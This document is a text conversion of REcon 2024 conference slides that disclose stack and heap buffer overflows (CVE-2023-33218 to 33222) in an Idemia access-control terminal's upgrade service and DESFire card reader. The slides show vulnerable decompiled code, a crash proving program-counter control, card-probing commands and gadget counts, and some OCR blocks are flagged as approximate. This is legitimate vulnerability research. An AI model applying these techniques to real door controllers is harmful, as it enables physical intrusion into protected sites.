---
title: "Open Sesame stack smashing your way into opening doors"
speakers: ["Lucas GEORGES"]
conference: "REcon"
conference_full: "REcon 2024"
edition: ""
year: 2024
source_pdf: "Recon 2024_Slides/Lucas GEORGES_Open Sesame stack smashing your way into opening doors.pdf"
pages: 65
sha256: "fa194aa06e9ba5e7b621fbe65a7cf0e255d652fbd7d08fcb38eff6e49a693ab5"
text_chars: 34623
ocr_pages: 22
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.6
ocr_unreliable_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:17:44Z"
---
# Open Sesame stack smashing your way into opening doors

**Speakers:** Lucas GEORGES  
**Conference:** REcon 2024  
**Source:** `Recon 2024_Slides/Lucas GEORGES_Open Sesame stack smashing your way into opening doors.pdf` (65 pages)


## Slide 1

# **OPEN SESAME**

## **Smashing stacks into opening doors**

**2024/06/30**

PUBLIC

## Slide 2

# **<u>Introduction</u>**

whoami

■ Lucas GEORGES ■ not that Lucas George

■ Reverse Engineer ~10y

■ Author of Dependencies: h�ps://github.com/lucasg/Depende ncies

■

#### Synack�v

■ Offensive security company

■ +170 ninjas

■ We are hiring!

**2**

PUBLIC

## Slide 3

# **<u>Introduction</u>**

**3**

PUBLIC

## Slide 4

# **<u>Introduction</u>**

What is physical security

■ Perimeter protec�on aka "walls and gates"

■ Access Control

■

(Tele)Surveillance

■

Intrusion Detec�on

■ Incident Response

■

#### Infrastruc�on protec�on

**Objectives:**

- Deterrence

- Intrusion slowness

**4**

PUBLIC

## Slide 5

# **<u>Access Control</u>**

**5**

PUBLIC

## Slide 6

# **<u>Introduction</u>**

#### Access Control

**6**

PUBLIC

## Slide 7

# **<u>Introduction</u>**

Access Control

### **Purposes**

- Iden�ty verifica�on

■ Authen�ca�on: PIN code or passphrase

■ 2nd factor: smartcard, key fob

■ Biometry

- Time & a�endance recording

**7**

PUBLIC

## Slide 8

# **<u>Introduction</u>**

#### Idemia Sigma Lite +

■ Idemia: formerly known as Morpho, industry leader

- High grade access control terminal

   - Authen�ca�on:

-

   - PIN

-

- Contactless: DESFIRE, Mifare,

- etc.

■ Biometric sensor using Morpho's technology

**8**

PUBLIC

## Slide 9

# **<u>Introduction</u>**

Contactless card

###### **Card information**

- `[usb] pm3 --> hf mfdes info [=] ---------- Tag Information --------[+]               UID: 04 47 42 72 EC 6A 80`

- `[+]      Batch number: B9 0C 10 49 40 [+]   Production date: week 24 / 2020`

- `[+]      Product type: MIFARE DESFire native IC (physical card)`

- `[=] ---------- Card capabilities ---------[=]     1.4 - DESFire Ev1 MF3ICD21/41/81, EAL4+`

- `[+] --- AID list [+] AIDs:  42494f                           <- b"BIO" [+] [+] Key: 2TDEA`

- `[+] key count: 1`

- `[+] PICC key 0 version: 0 (0x00)`

**9**

PUBLIC

## Slide 10

# **<u>Introduction</u>**

Contactless card

### **Authentication with default key**

`[usb] pm3 --> hf mfdes auth -t 2tdea -k 00000000000000000000000000000000 --aid 000000 [#] error DESFIRESendApdu Current authentication status does not allow the requested command [!!]` 🚨 `Desfire authenticate error. Result: [7] Sending auth command failed [-]` ⛔ `Select or authentication AID 000000 failed. Result [7] Sending auth command failed [usb] pm3 --> hf mfdes read -t 2tdea -k 00000000000000000000000000000000 -n 1 --aid 42494f --fid 00 [#] error DESFIRESendApdu Current authentication status does not allow the requested command [!!]` 🚨 `Desfire authenticate error. Result: [7] Sending auth command failed [-]` ⛔ `Select or authentication AID 42494f failed. Result [7] Sending auth command failed`

**10**

PUBLIC

## Slide 11

# **<u>Reversing</u>**

**11**

PUBLIC

## Slide 12

# **<u>Reversing</u>**

#### Firmware Analysis

\```
$ binwalk -E firmware/Firmware-upgrade-malite-plus.4.9.4-prod.bin
DECIMAL       HEXADECIMAL     ENTROPY
\```

\```
0             0x0             Rising entropy edge (0.999458)
\```

**12**

PUBLIC

## Slide 13

# **<u>Reversing</u>** Firmware Analysis

\```
$ hexdump -C firmware/Firmware-upgrade-malite-plus.4.9.4-prod.bin | head
00000000  4d 41 46 57 01 00 00 00  53 61 6c 74 65 64 5f 5f  |MAFW....Salted__|
00000010  cc c2 8d e2 0b 8b 19 3a  1b 24 36 ee 4b 3f 13 19  |.......:.$6.K?..|
00000020  00 52 f0 9b 31 5b 78 ba  c5 3d 6c a2 25 2c 3a 13  |.R..1[x..=l.%,:.|
00000030  71 a8 16 f0 82 b9 af 7d  83 1d 4f 36 44 0f 96 64  |q......}..O6D..d|
00000040  a2 f0 a7 33 7a fb 17 5e  cb 9f 29 26 fe 60 0f 2a  |...3z..^..)&.`.*|
00000050  f8 2c 91 db e3 dc 8b 9c  14 ca 1b 8d 6a 8b 78 05  |.,..........j.x.|
00000060  1e c6 8c f4 e1 5e ff 19  21 45 80 81 d3 d7 b6 3b  |.....^..!E.....;|
00000070  83 a4 d6 4d 4b 66 48 ba  d6 1e 42 cf 86 84 28 9e  |...MKfH...B...(.|
00000080  36 b4 62 91 19 e0 84 c3  eb 79 97 93 65 d3 11 d5  |6.b......y..e...|
00000090  8b ec c5 c2 8f e0 09 b9  56 a8 5a fb af f9 25 65  |........V.Z...%e|
\```

**13**

PUBLIC

## Slide 14

# **<u>Reversing</u>**

Upgrader

\```
PS \> C:\Morpho\MBTB\Resources\x64\MA_Sigma_Upgrade_Tool.exe -h
MorphoAccess SIGMA Upgrade Tool. Copyright ® IDEMIA Identity & Security France 2016-2019.
\```

\```
Options:
\```

\```
  -h [ --help ]                 Displays help and exit without upgrading
                                firmware.
\```

\```
  -v [ --verbose ]              Enables verbose mode.
  -q [ --quiet ]                Enable quiet mode.
  -f [ --file ] arg             Path to the binary file used for upgrade.
  -e [ --term ] arg             IP address of the terminal to upgrade.
  -p [ --port ] arg (=11001)    Application port of the terminal to upgrade.
  -t [ --timeout ] arg (=10000) Connection timeout in milliseconds.
  --log arg                     Append timestamped application output to the
                                specified log file.
\```

\```
Examples:
\```

\```
    C:\Morpho\MBTB\Resources\x64\MA_Sigma_Upgrade_Tool.exe -f new_firmware.bin -e 192.168.1.2
        Upgrades firmware of terminal at address 192.168.1.2 using file new_firmware.bin
\```

- `C:\Morpho\MBTB\Resources\x64\MA_Sigma_Upgrade_Tool.exe -f new_firmware.bin -e 192.168.1.2 -t 15000 as above, using a timeout of 15 seconds.`

- `C:\Morpho\MBTB\Resources\x64\MA_Sigma_Upgrade_Tool.exe -v -f new_firmware.bin -e 192.168.1.2 as above, enabling using verbose mode.`

\```
Return codes:
\```

- `0: The terminal firmware has been successfully updated.`

- `1: The application has encountered an internal error.`

- `2: The firmware update package is invalid or corrupted.`

- `3: The application cannot connect to the terminal.`

- `4: The terminal signaled an error during the update.`

- `5: The firmware update package is incompatible with this terminal.`

- `6: The application given an invalid argument.`

- `7: The firmware update package is incompatible with this terminal firmware version.`

**14**

PUBLIC

## Slide 15

# **<u>Reversing</u>**

Upgrader

**15**

PUBLIC


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Reversing
Upgrader
Choose segment to jump
Name
.idata
-idata_
ppnurban
akzdibcw
Line 5 of 9
Start
0000000140001000
000000014032D000
000000014032D033
000000014032D04B
000000014032E000
0000000140719000
0000000140942000
0000000140943000
0000000140960000
End R W X D L Align Base _— Type
000000014032C000 R W X L_ para 0001 public
000000014032D033 R W L para 0002 public
000000014032D04B R W L_ para 0008 public
000000014032E000 RW. L para 0002 public
0000000140719000 R W X L_ para 0003 public
0000000140942000 R W X L para 0004 public
0000000140943000 R W X L_ para 0005 public
0000000140960000 R.. L_ para 0006 public
0000000140963000 R W X L_ para 0007 public
[ @ok | XX Cancel Search S2Help
Class
CODE
DATA
XTRN
DATA
CODE
CODE
CODE
DATA
CODE
AD
64
64
64
64
64
64
64
64
64
es
0000
0000
0000
0000
0000
0000
0000
0000
0000
ss
0000
0000
0000
0000
0000
0000
0000
0000
0000
ds
0001
0001
0001
0001
0001
0001
0001
0001
0001
fs
FFFFF...
FFFFF...
FFFFF...
FFFFF...
FFFFF...
FFFFF...
FFFFF...
FFFFF...
FFFFF...
gs
FFFFFFFFF...
FFFFFFFFF...
FFFFFFFFF...
FFFFFFFFF...
FFFFFFFFF...
FFFFFFFFF...
FFFFFFFFF...
FFFFFFFFF...
FFFFFFFFF...
15
```

## Slide 16

# **<u>Reversing</u>**

Upgrader

**16**

PUBLIC

## Slide 17

# **<u>Reversing</u>**

#### Fake server

**17**

PUBLIC


> Recovered by OCR — confidence 94/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Reversing
Fake server
Process Entry
.text unpacking
by themida
connect
loading
firmware
decrypting
firmware
upgrade
state machine
v
untar archive
```

## Slide 18

# **<u>Reversing</u>**

Results

PUBLIC{height=75%}

**18**


> Recovered by OCR — confidence 87/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Reversing
Results
> | exfiltrate_firmware
| Fite | Home
4
gh Quick access
=| Documents
= Pictures
blogpost
Debug
firmware
traces_ttd
@ OneDrive
WW This Pc
BB 3D Objects
IM Desktop
7 items
Share View
exfiltrate_firmware
bd Name
exfiltrated_BOOTLOADER_1.bin
_| exfiltrated_BOOTLOADER_2.bin
exfiltrated_DTB_A.bin
exfiltrated_KERNEL_A.bin
exfiltrated_KERNEL_B.bin
exfiltrated_MAP_TABLE.bin
_| exfiltrated_UBIFS_A.bin
®x4000 bytes of data
16399
®x4000 bytes of data
1623
®x648 bytes of data
43
Finalizing upgrade session 3/3. Please wait. \xo00\ 60\x00\x60'
Upgrade session 3/3 completed. [UPGRADE] len(data) : 7
Requesting terminal reboot in normal mode. Please wait. [UPGRADE] message type : 9x81234
The terminal firmware has been successfully updated. [UPGRADE] message : b''
Ps C:\Users\User>
fheight=75%}
18
```

## Slide 19

# **<u>Reversing</u>**

#### Contactless card reversing

**19**

PUBLIC


> Recovered by OCR — confidence 84/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Reversing
Contactless card reversing
[F] Desfire_ComputeCmac_
[| sub_3F61D4
[F) Desfire_Command
[F) sub_3F6338
[F) sub_3F638C
[7] sub_3F6608
[| sub_3F6AB4
[7] sub_3F6B18
[F) Desfire_CreateCyclicRecordFile
4
Line 10638 of 10638
003F5C30
003F5C70
003F5D08
003F5D48
003F5D88
003F6088
003F613C
003F61D4
003F6210
003F6338
003F638C
003F6608
003F6A04
003F6A18
003F6A20
003F6A34
003F6B04
003F6B18
003F6BA0
003F6C18
003F6C94
003F6D0C
003F6D88
003F7024
003F70B8
003F70F8
00000038
00000038
00000038
00000038
00000134
000001B4
00000090
00000034
00000120
00000054
00000278
00000008
00000014
00000008
00000014
00000048
00000038
00000014
0000003C
00000014
00000080
00000070
00000074
00000070
00000074
00000088
0000008C
00000088
0000008C
00000038
00000200
oC
oC
oC
oC
oC
oC
oC
oC
oC
oc
oC
oC
oC
oC
oc
ae
19
```

## Slide 20

# **<u>IDEA: gain arbitrary call execution on the device</u>**

**20**

PUBLIC

## Slide 21

# **<u>Hardware</u>**

**21**

PUBLIC

## Slide 22

# **<u>Hardware</u>**

**22**

PUBLIC


> Recovered by OCR — confidence 89/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Hardware
USB for WiFi dongle
USB OTG )
RS484
NAND
IGDID NW190 Microns
Application Processor
MCIMX6S5EVM10AB
CTAP2042
RAM
QUAH7 D9XCF Microns
Contactless sensor
22
```

## Slide 23

# **<u>Hardware</u>**

\```
U-Boot 2014.04-svn3586 (May 25 2021 - 02:12:30)
CPU:   Freescale i.MX6SOLO rev1.1 at 792 MHz
CPU:   Temperature 22 C, calibration data: 0x59951069
Reset cause: POR
Board: MX6S MALITES
Ma1000 Hardware config Alpha(V1) (0x3f)
\```

\```
DRAM:  512 MiB
NAND:  512 MiB
MMC:   FSL_SDHC: 0
Using default environment
In:    serial
Out:   serial
Err:   serial
Net:   CPU Net Initialization Failed
No ethernet found.
Signature data len=8144 ... OK
Retrofit successful
\```

\```
morphosb_secureboot bootnb=0 binnb=7
Signature data len=40689 ... OK
\```

\```
Authenticate uImage from DDR location 0x10007fc0...
Secure boot enabled
HAB Configuration: 0xcc, HAB State: 0x99
No HAB Events Found!
\```

\```
## Booting kernel from Legacy Image at 10007fc0 ...
   Image Name:   Linux-4.1.15
   Image Type:   ARM Linux Kernel Image (uncompressed)
   Data Size:    7861528 Bytes = 7.5 MiB
   Load Address: 10008000
   Entry Point:  10008000
## Flattened Device Tree blob at 11000000
   Booting using the fdt blob at 0x11000000
   XIP Kernel Image ... \0   Loading Device Tree to 2e146000, end 2e152e28 ... OK
Starting kernel ...
\```

**23**

PUBLIC

## Slide 24

# **<u>Boot</u>**

**24**

PUBLIC

## Slide 25

**<u>Boot</u>** Boot Process

**25**

PUBLIC


> Recovered by OCR — confidence 90/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Boot
Boot Process
NAND
MAP_TABLE
CPU RESET
Boot ROM
RAM
LMX6 HAB
BOOTLOADER A
BOOTLOADER B
DTB_A
KERNEL B
UBIFS_A
BOOTLOADER A
U-Boot bootlader
¥
MAP_TABLE
Partition Check
on error,
Partition Check
Secure Boot Check
Partition Load [7
Secure Boot Check
Linux entry point
25
```

## Slide 26

# **<u>Boot</u>**

Partition Check

###### **Partition signature check**

- `RSA-SSA-PKCSv1.5` scheme for package signature

- `SHA256` for hash digest

###### **Hardcoded 1024 bit RSA Key**

\```
RSA Public-Key: (1024 bit)
Modulus:
\```

\```
00:c2:3f:3a:77:ff:c7:65:28:60:1d:cd:ec:45:6c:
a6:a5:9a:c4:aa:c9:89:51:88:b1:a4:3f:1a:07:27:
15:c8:c0:30:bd:84:4f:cd:8b:43:97:b5:aa:d9:ff:
42:00:5a:08:e5:96:d3:b7:4b:26:f2:bf:ae:fa:6b:
0d:62:6c:13:ab:65:d2:11:16:66:a3:80:e2:6a:55:
c0:8d:8e:05:16:cd:d8:8f:38:8d:50:f9:c1:34:3d:
eb:59:3a:90:b2:31:a2:54:08:a9:75:10:06:05:74:
d9:9e:ca:4f:63:8d:86:d8:af:92:e9:46:dc:4b:57:
93:ab:4b:a8:ee:c7:22:e4:43
Exponent: 65537 (0x10001)
\```

**26**

PUBLIC

## Slide 27

# **<u>Upgrade mode</u>**

**27**

PUBLIC

## Slide 28

# **<u>Upgrade mode</u>**

Boot process

**28**

PUBLIC


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Upgrade mode
Boot process
LZ kernel
Uncompressing kernel ...
padding
Linux version 4.1.15
(g509649@debian8-ma5g)
(gcc version 4.9.3 (GCC) )
#2 SMP PREEMPT
Tue May 25 02:14:59 CEST 2021
initramfs cpio
Izo + cpio
rootfs
discovery_app
mep_sr
28
```

## Slide 29

# **<u>Upgrade mode</u>**

#### `mep_sr`

■ relies on `libmep-secure-retrofit.so` ■ Upgrade server, implemented in C-like language ■ 3 ways to "push" an upgrade:

■ via the Ethernet port, server listening on port 1981 ■ via a "USB device"

■ via a SD card on the USB front panel

- Binary upgrade format, TLV style

**29**

PUBLIC

## Slide 30

# **<u>Upgrade mode</u>**

\```
mep_sr
\```

**30**

PUBLIC


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Upgrade mode
mep_sr
*(int (_fastcall **) (void *, int
while (1 )
buf, 0xA00000, &
break;
if (v4l)
= j_slave_getmsginfo(morpho_msgbuf,
int *))((char *)&word_10 + ha
38 && *(int *) ((char *)&dword_14 + handler) && *(_DWORD
size);
printf ("slave_getmsginfo returned %i\n", v41);
_send_to_client((int (__fastcall **) (char *
}
else if ( LOWORD(msg[0]) == 0x1234 )
switch ( HIWORD (r
case 1:
puts
if (
1)
v46 = j_morphosr_session_retrofitbin (&v72,
else
- Retrofit binary ---");
v46 = _check_upgrade_retrofit_package (
t fastcall **) (int, char *, int,
h.
0);
goto LABEL_106;
case 8:
puts ("--- Reboot ");
v55 = _send_to_client((int (_
j_morphocmd_reboot (v55) ;
break;
case 3:
printf ("--- Setflag, str = %s,
v46 = _set_flag(s2, (int)v69);
goto LABEL_106;
jler,
-- Getflag ---");
flag = _get_flag(s2, &v69)
if ( flag )
goto LABEL_104;
= 12;
[2] = (int)s2;
_fastcall **) (char
value =%x ---\n",
size, msg);
*
int, char *)) (har
int) ) (handler
, int)) (handler + 20), -1012);
handler, handler, 0);
+ 20),
0);
30
```

## Slide 31

# **<u>Upgrade mode</u>**

|**Cmd ID**|**Name**|**Description**|
|---|---|---|
|01|Retrofit binary|Process a legacy upgrade package|
|08|Reboot|reboot the terminal|
|09|SetFlag|modify flags: [“gotoretrofit”, “bootnumber”, “error”]|
|10|GetFlag|retrieve flags: [“gotoretrofit”, “bootnumber”, “error”]|
|13|**ParameterZoneRead**|retrieve the ParameterZone|
|15|**ParameterZoneWrite**|update the ParameterZone|
|16|Applica�ve update|Process an upgrade package|
|17|Retrofit update|Process a legacy upgrade package|
|18|So�ware version|return terminal’s sw version|
|19|Session init|init “create” an update session|
|20|Session commit|commit commit an update session|
|21|Session abort|abort abort an update session|
|22|**Retrofit valida�on**|check upgrade’s metadatas|

**31**

PUBLIC

## Slide 32

# **<u>Upgrade mode</u>**

#### Parameter Zone

- Persistent memory zone in NAND

- ■ Device configura�on (IP resolu�on,

- MAC, etc.)

- Read/Writable by an a�acker

**32**

PUBLIC

## Slide 33

# **<u>Upgrade mode</u>** Parameter Zone

**33**

PUBLIC


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Upgrade mode
Parameter Zone
BANK A BANK B
mep_sr
init.d
core_app
set_macaddress.sh set_hostname.sh
—
Terminal_InfoTest
config_network.sh
wpa_passphrase
usb_gadget_commands_args
SagemSecurite_LicenseDaemon
tinfo libCheck_Retrofit.so
one_time_script.sh
ae one-time-app
discovery_app
tinfo
libTerminalinfo.so libTerminalinfo.so
ParamZone
33
```

## Slide 34

# **<u>Upgrade mode</u>**

Parameter Zone

### **Uncontrolled** **`strcpy` calls:**

|**CVE ID**|**Score**|**Description**|
|---|---|---|
|CVE-2023-33218|9.1 - CRITICAL|Stack Buffer Overflow in a binary run at upgrade startup|
|CVE-2023-33219|9.1 - CRITICAL|Stack Buffer Overflow when checking retrofit package|
|CVE-2023-33220|9.1 - CRITICAL|Stack Buffer Overflow when checking some a�ributes during retrofit|

**34**

PUBLIC

## Slide 35

# **<u>Upgrade mode</u>**

#### Parameter Zone

###### **Example:**

\```
int __fastcall check_device_information(
constchar *arg_part_number,
constchar *arg_firmware_version,
constchar *arg_hardware_version
)
{
\```

\```
char min_dwngd_version[48]; // [sp+10Ch] [bp-120h] BYREF
char min_firmware_version[48]; // [sp+140h] [bp-ECh] BYREF
int pkg_part_number[12]; // [sp+174h] [bp-B8h] BYREF
int cie_part_number[12]; // [sp+1A8h] [bp-84h] BYREF
\```

- `// get_device_information() source from PARAMETER_ZONE that we control`

- `j_get_device_information((int)”MIN_FIRMWARE_VERSION”, (int)min_firmware_version); j_get_device_information((int)”MIN_DWNGD_VERSION”, (int)min_dwngd_version); j_get_device_information((int)”CIE_PART_NUMBER”, (int)cie_part_number); // [...]`

**35**

PUBLIC

## Slide 36

# **<u>Upgrade mode</u>**

Parameter Zone

##### **Example:**

\```
int __fastcall get_device_information(constchar *value, char *output_buffer)
{
\```

\```
    field_list_value tmp;
\```

\```
    v2 = strlen(value);
    tmp.key = (int)malloc(v2 + 1);
if ( !tmp.key )
\```

\```
returnprintf(”Null pointer %s %d \n”, ”get_device_information”, 410);
strcpy((char *)tmp.key, value);
\```

\```
if ( !get_field_list((int)&tmp, 1) )
    {
if ( tmp.value )
\```

\```
// tmp.value is controlled, output_buffer is a stack buffer.
strcpy(output_buffer, (constchar *)tmp.value);
\```

**36**

PUBLIC

## Slide 37

# **<u>Upgrade mode</u>**

#### Exploitation

\```
(qiling_env) $ python emulate.py
Upgrading firmware application
morphosr_session_init
morphosr_session_delete
--- Retrofit validation ---
--- Library /usr/lib/libCheck_retrofit.so.1 open success----
Retrofit validation library open success
Retrofit validation start .…
upgrade version is 1.23.345.66 Higher min firmware version 1.23.345.66
upgrade version is 1.23.345.66 min dwngd version 1.23.345.66
HW versions to upgrade:88,99, Current CIE_PIN:88
ERROR:Product nos. to upgrade:, Current product number:AAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\```

\```
[x] [Thread 2000]       CPU Context:
[x] [Thread 2000]       r0      : 0x12
[x] [Thread 2000]       r1      : 0x0
// ...
[x] [Thread 2000]       r9      : 0x90017864
[x] [Thread 2000]       r10     : 0x90017668
[x] [Thread 2000]       r11     : 0x41414141
[x] [Thread 2000]       r12     : 0x0
[x] [Thread 2000]       sp      : 0x7ff3c228
[x] [Thread 2000]       lr      : 0x90d60c5c
[x] [Thread 2000]       pc      : 0x41414140
[x] [Thread 2000]       cpsr    : 0x600101f3
[x] [Thread 2000]       c1_c0_2 : 0x0
[x] [Thread 2000]       c13_c0_3: 0x9035ba40
\```

\```
[x] [Thread 2000]       fpexc   : 0x40000000
\```

\```
[x] [Thread 2000]       PC = 0x41414140 (unreachable)
\```

**37**

PUBLIC

## Slide 38

# **<u>Upgrade mode</u>**

### **Mitigations**

- `NX` bit set => stack is not executable

- `PIE` bit not set => `mep_sr` is at address 0x10000

### **Sections**

- `.text` : 4688 bytes

- `.data` : 232 bytes

**38**

PUBLIC

## Slide 39

# **<u>Upgrade mode</u>**

Exploitation

### **Gadgets**

- `$ rp-lin-x86_64 --unique -r 4  --file /rootfs_volume/usr/bin/mep_sr A total of 63 gadgets found.`

- `$ rp-lin-x86_64 --unique --thumb -r 6  --file /rootfs_volume/usr/bin/mep_sr A total of 6 gadgets found.`

**39**

PUBLIC

## Slide 40

# **<u>Nominal mode</u>**

**40**

PUBLIC

## Slide 41

# **<u>Nominal mode</u>**

#### Attack surface

■ Ethernet access on back panel ■ Webserver on port 80 ■ Apache Thri� on port 11010

■ USB port on front panel

■ USB Wifi port on back panel

■ Contactless card

■ Malicious finger ?

**41**

PUBLIC

## Slide 42

# **<u>Nominal mode</u>**

Contactless

**42**

PUBLIC

## Slide 43

# **<u>Nominal mode</u>**

#### Springprox SDK

**43**

PUBLIC


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Springprox SDK
€ > CGC) @ springcard.com/en/download/sdks
HOME PRODUCTS SERVICES USECASES ABOUT |Q
Downloads: SDKs & tools for developers
Previous versions are hidden [Show]
Filename Version Upload date Size
SCardSniffer2
SH sg21196-2110.exe 2110 21/10/2021 3389
kb
SCardSniffer2 is a "spy" that monitors the exchanges between a PC/SC application and a smart card
SDK for ROR
@& = iwm2-sdk_150505.zip 150505 05/05/2015 62554
kb
SDK for all RDR products (FunkyGate-IP NFC, FunkyGate-DW NFC)
SpringProx SDK, for CSB4, K632, K663, Prox'N'Drive...
& springprox-sdk_1-80.zip 1-80 18/09/2015 7027
kb
SDK for SpringProx-CF and SpringProx-CF-UP
& springprox-ppc-sdk_1-50.zip 1-50 18/09/2015 6810
kb
kb
SDK for mobile products : SpringProx-CF, SpringProx-RC, SpringWAP.
SDK SpringProx API (CSB Legacy, K531/K632)
43
```

## Slide 44

# **<u>Nominal mode</u>**

#### Desfire command list

**44**

PUBLIC


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Desfire command list
Security related commands
A | Authenticate (AES)
A | Authenticate (iso)
oA | Authenticate (Legacy)
54 | Change KeySettings
SC | Set Configuration
©4 | Change Key
64 | Get Key Version
Card level commands
Start the authentication process for a key, using AES
Start the authentication process for a key, using 3DES or 3K3DES
Start the authentication process fora key, using simple DES
Change the settings for a key
Card level configuration
Change a key
Returns a key version byte
ca | Create Application
6A | Get Applications IDs
60 | GetDFNames
45 |Get KeySettings
5a | Select Application
FC | FormatPICC
60 | Get Version
st | GetCardUID
Create a new application
Delete an application
Get a list of application IDs
Get free memory details
Get the data file names
Get details of a keys settings
Select application
Format the card
Get version details for card
Get the read ID for the card (can be set so a random ID is used as
part of collision detection, rather than the real ID).
Application level commands
6F | Get FilelDs
F5 | Get FileSettings
oF | Change FileSettings
CD | Create StdDataFile
= | Create BackupDataFile
Geta list of file IDs
Get a list of ISO file IDs
Get file settings for a specific existing file
Change file settings for a specific existing file
Creates a file for arbitrary binary data
Creates a file for arbitrary binary data but with a commit process so
changes apply reliably all in one go
Application level commands
CC | Create ValueFile Creates a file to hold a 32 bit value
C1 | Create LinearRecordFile Create a file to allow records of fixed size to be added until full
co | Create CyclicRecordFile Create a file to allow records of fixed size to be added. clearing the
oldest record automatically - ideal for a history or a log
OF | DeleteFile Delete a file
Data manipulations commands
eo | Read Data Read data from standard or backup file
3p | Write Data Write data to standard or backup file (write to backup only happens
when commit is done)
6C | Get Value Get the value from a value file
OC | Credit Increase the value in a value file
DC | Debit Decrease the value in a value file
io | Limited Credit Increase the value in a value file without having full permissions to
that file, up to a limit
3B | Write Record Write a record to a linear or cyclic record file
BB | Read Records Read records from a linear or cyclic record file
EB | Clear RecordFile Clear a linear or cyclic record file
C7 | Commit Transaction Commit writes to backup, value, or record files
A? | Abort Transaction Discard writes to backup, value, or record files
```

## Slide 45

# **<u>Nominal mode</u>**

#### Springprox SDK

**45**

PUBLIC


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Springprox SDK
SPROX_API_FUNC(Desfire_GetVersion) (SPROX_PARAM DF_VERSION_INFO *pVersionInfo)
DWORD recv_length = 1;
BYTE recv_buffer[256];
SPROX_RC status;
SPROX_DESFIRE_GET_CTX();
if (pVersionInfo != NULL)
memset(pVersionInfo, ®, sizeof(DF_VERSION_INFO) ) ;
/* create the info block containing the command code */
ctx->xfer_length = 0;
ctx->xfer_buffer[ctx->xfer_length++] = DF_GET_VERSION;
for (;;)
status = SPROX_API_CALL(Desfire_Command) (SPROX_PARAM_P @, COMPUTE_COMMAND_CMAC | WANTS_ADDITIONAL_FRAME |
WANTS_OPERATION_OK) ;
if (status != DF_OPERATION_OK)
goto done;
memcpy (&recv_buffer[recv_length], &ctx->xfer_buffer[INF + 1], ctx->xfer_length - 1);
recv_length += (ctx->xfer_length - 1);
if (ctx->xfer_buffer[INF + @] != DF_ADDITIONAL_FRAME)
break;
ctx->xfer_length = 1;
45
```

## Slide 46

# **<u>Nominal mode</u>**

#### Springprox SDK

**46**

PUBLIC


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Nominal mode SYNACKTIV
Springprox SDK
SPROX_API_FUNC(Desfire_GetVersion) (SPROX_PARAM DF_VERSION_INFO *pVersionInfo)
DWORD recv_length = 1;
[BYTE recv_buffer [256];
SPROX_RC status;
SPROX_DESFIRE_GET_CTX();
if (pVersionInfo != NULL)
/* create the info block containing the command code */
ctx->xfer_length = 0;
ctx->xfer_buffer[ctx->xfer_length++] = DF_GET_VERSION;
for (;;)
status = SPROX_API_CALL(Desfire_Command) (SPROX_PARAM_P @, COMPUTE_COMMAND_CMAC | WANTS_ADDITIONAL_FRAME |
WANTS_OPERATION_OK) ;
if (status != DF_OPERATION_OK)
goto done;
memcpy (&recv_buffer[recv_length], &ctx->xfer_buffer[INF + 1], ctx->xfer_length - 1);
recv_length += (ctx->xfer_length - 1);
if (ctx->xfer_buffer[INF + @] != DF_ADDITIONAL_FRAME)
break;
ctx->xfer_length = 1; 46
```

## Slide 47

# **<u>Nominal mode</u>**

Springprox SDK

### **Same pattern, different vulnerability**

**47**

PUBLIC


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Springprox SDK
Same pattern, different vulnerability
SPROX_API_FUNC(Desfire_ReadDataEx) (SPROX_PARAM BYTE read_command, BYTE
file_id, BYTE comm_mode, DWORD from_offset, DWORD item_count, DWORD item_size,
BYTE data[], DWORD *done_size)
//
[xrecv_buffer = malloc(buffer_size) ;
if (recv_buffer == NULL)
return DFCARD_OUT_OF_MEMORY;
recv_buffer[recv_length++] = DF_OPERATION_OK;
for (;;)
status = SPROX_API_CALL(Desfire_Command) (SPROX_PARAM_P 2,
COMPUTE_COMMAND_CMAC | FAST_CHAINING_ALLOWED | WANTS_ADDITIONAL_FRAME
WANTS_OPERATION_OK) ;
if (status != DF_OPERATION_OK)
goto done;
memcpy (&recv_buffer[recv_length], &ctx->xfer_buffer[INF + 1],
ctx->xfer_length - 1);
recv_length += (ctx->xfer_length - 1);
if (ctx->xfer_buffer[INF + @] != DF_ADDITIONAL_FRAME)
break;
ctx->xfer_length = 1;
41
```

## Slide 48

# **<u>Nominal mode</u>**

### **Issues found on nominal mode:**

|**CVE ID**|**Score**|**Description**|
|---|---|---|
|CVE-2023-33221|7.8 - HIGH|Heap Buffer Overflow when reading DESFire card|
|CVE-2023-33222|9.1 - CRITICAL|Stack buffer overflow when reading DESFire card|

**48**

